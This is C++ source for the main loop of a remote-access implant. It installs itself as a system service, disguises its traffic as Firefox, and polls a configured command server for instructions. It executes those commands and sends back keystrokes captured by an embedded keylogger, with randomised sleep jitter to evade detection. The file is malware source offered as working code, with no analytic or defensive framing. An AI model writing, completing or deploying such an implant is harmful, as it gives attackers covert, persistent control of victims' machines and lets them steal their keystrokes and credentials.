#include <HttpUtils.hpp>
#include <RESTClient.hpp>
#include <cpppwn.hpp>
#include <filesystem>
#include <print>

#include "BeaconLoop.hpp"
#include "CommandDispatcher.hpp"
#include "Config.hpp"
#include "Installer.hpp"
#include "Payloads.hpp"
#include "SessionManager.hpp"
#include "Types.hpp"
#include "Util/SafeLogger.hpp"

int main(int argc, char* argv[]) {
    bool is_installation = false;
    Keylogger keylogger;
    SessionManager sessionMan;
    BeaconState beacon_state;

    for (int i = 1; i < argc; ++i) {
        if (std::string(argv[i]) == "--install") {
            is_installation = true;
            break;
        }
    }

    if (is_installation) {
        if (installSystemService(config.service_name, config.service_desc)) {
            return 0;
        }
        return 1;
    }

    logger::debug("Starting main logic of the implant...");

    const auto& browser_config = HttpConfig(BrowserType::Firefox);
    cpppwn::RESTClient rest_client(config.server_url, browser_config);
    rest_client.set_auth_basic(config.username, config.password);

    const auto default_sleep = std::atol(config.default_timeout);
    int current_sleep = static_cast<int>(default_sleep);
    std::atomic<bool> running{true};

    CommandDispatcher dispatcher(
        current_sleep,
        keylogger,
        sessionMan,
        running,
        config.username,
        config.password);

    while (running) {
        const std::vector<CommandDAO> command_list = beacon_state.send_beacon(rest_client);

        logger::debug("UUID: {} | Count of Commands: {}", get_or_create_implant_id(), command_list.size());

        for (const auto& cmd : command_list) {
            logger::debug("Executing Command:\n- UUID: {}\n- CLIENT: {}\n- COMMAND: {}", cmd.uid, cmd.client, cmd.command);

            auto result = dispatcher.dispatch(cmd);
            beacon_state.add_result(result);

            if (cmd.command.starts_with("uninstall")) {
                running = false;
                break;
            }

            if (keylogger.is_running()) {
                auto logs = keylogger.collect_and_clear();
                if (not logs.empty()) {
                    CommandResult key_result;
                    key_result.command_uid = "kl_" + get_or_create_implant_id();
                    key_result.status = 1;

                    std::string flattened;
                    for (const auto& k : logs) {
                        flattened += (k == "SPACE" ? " " : (k == "ENTER" ? "\n" : k));
                    }
                    key_result.result_data = flattened;
                    logger::debug("Keylogger: {}", flattened);
                    beacon_state.add_result(key_result);
                }
            }
        }

        if (not running) {
            break;
        }

        const int jitter = static_cast<int>(generate_nonce() % 60);
        const auto sleep_duration = std::chrono::minutes(current_sleep) + std::chrono::seconds(jitter);
        logger::debug("Sleeping for {}:{} min", current_sleep, jitter);
        std::this_thread::sleep_for(sleep_duration);
    }

    sessionMan.stop_sessions();
    keylogger.stop();
    logger::debug("Shutting down Implant!");

    return 0;
}
